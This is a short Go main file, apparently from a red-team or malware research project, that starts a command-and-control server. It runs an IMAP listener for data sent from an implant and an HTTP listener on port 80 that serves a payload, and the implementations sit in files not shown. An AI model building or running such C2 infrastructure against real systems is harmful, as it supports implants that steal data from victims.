package main

import "simap/c2"

/**
* Simple IMAP server using no third party dependancies.
* Additionally listens on port :80 to serve the payload.
* @author 0xflux
 */

func main() {
	// look in http.go and imap.go for the implementations of the C2.

	go c2.ListenForIMAP() // to listen for data being sent from the implant
	go c2.ListenForHTTP() // to serve our payload

	select {} // block main routine
}
